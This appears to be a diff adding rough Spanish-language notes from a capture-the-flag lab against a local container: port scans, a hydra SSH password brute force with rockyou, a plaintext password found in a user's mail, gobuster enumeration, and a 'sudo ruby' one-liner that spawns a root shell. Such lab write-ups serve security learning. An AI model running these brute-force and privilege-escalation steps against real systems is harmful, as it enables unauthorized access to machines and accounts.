@@ -1,1 +1,90 @@
+$ nmap -sS -p- -Pn -n 172.17.0.2 -oN fScan -> primer escaneo 
 
+Descubrimos servicios en el puerto 22 y 80.
+
+$ nmap -sV -sT 172.17.0.2 -oN pScan
+
+$ curl http://172.17.0.2 -> Obtenemos información, "...de Juan para Camilo"
+
+$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -o resultado.txt -> Obtención de credenciales de usuario camilo
+
+╔══════════╣ Mails (limit 50)
+  1617949      4 -rw-r--r--   1 root     mail          144 Apr 25  2024 /var/mail/camilo/correo.txt                                                         
+  1617949      4 -rw-r--r--   1 root     mail          144 Apr 25  2024 /var/spool/mail/camilo/correo.txt
+
+╔══════════╣ Backup folders
+drwxr-xr-x 2 root root 4096 Apr 24  2018 /var/backups                                                                                                       
+total 0
+
+
+camilo@01c517514f78:~$ ls
+linpeas.sh
+camilo@01c517514f78:~$ cd /var/mail/camilo/correo.txt 
+bash: cd: /var/mail/camilo/correo.txt: Not a directory
+camilo@01c517514f78:~$ ls
+linpeas.sh
+camilo@01c517514f78:~$ cd /var/mail/camilo/
+camilo@01c517514f78:/var/mail/camilo$ ls
+correo.txt
+camilo@01c517514f78:/var/mail/camilo$ cat correo.txt 
+Hola Camilo,
+
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+
+
+
+┌──(root㉿kali)-[~user/tools]
+└─# gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/common.txt -t 50          
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/seclists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 275]
+/.hta                 (Status: 403) [Size: 275]
+/.htaccess            (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 74]
+/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
+/server-status        (Status: 403) [Size: 275]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+Probar sudo -l para ver si se puede hacer algo como sudo 
+
+juan@01c517514f78:/etc/apache2/sites-enabled$ sudo -l
+Matching Defaults entries for juan on 01c517514f78:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User juan may run the following commands on 01c
+
+
+
+SEARCHBINS
+
+
+sudo ruby -e 'exec "/bin/sh"'
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                            
